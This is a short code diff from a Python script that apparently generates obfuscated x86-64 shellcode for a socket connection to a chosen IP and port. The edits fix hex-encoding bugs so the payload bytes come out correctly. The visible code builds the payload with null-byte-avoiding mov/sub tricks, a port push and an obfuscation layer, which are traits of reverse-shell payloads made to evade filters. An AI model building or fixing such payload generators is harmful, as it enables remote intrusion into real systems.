@@ -266,7 +266,7 @@ def socket_connect(ip, port):
         of_string = of_string[::-1]
         print("2:", of_string)
         PAYLOAD += "48bb"
-        PAYLOAD+=of_string
+        PAYLOAD+= of_string
         print("2: ", add_string)
         #Désoffuscation
         deof_string = deOffus(random1, add_string)
@@ -310,13 +310,13 @@ def socket_connect(ip, port):
    add_string += "be" # mov esi
    for i in range(0,len(ip_greater)):
        if ip_greater[i] < 17: PAYLOAD += "0"
-       PAYLOAD += hex(ip_greater[i])[:2]
+       PAYLOAD += hex(ip_greater[i])[2:]
 
 
    add_string += "83ee" # sub esi
    for i in range(0, len(ip_to_substract)):
         if ip_to_substract[i] < 17: PAYLOAD += "0"
-        PAYLOAD += hex(ip_to_substract[i])[:2]
+        PAYLOAD += hex(ip_to_substract[i])[2:]
 
    port = hex(socket.htons(int(port)))
    add_string += "566668" # push
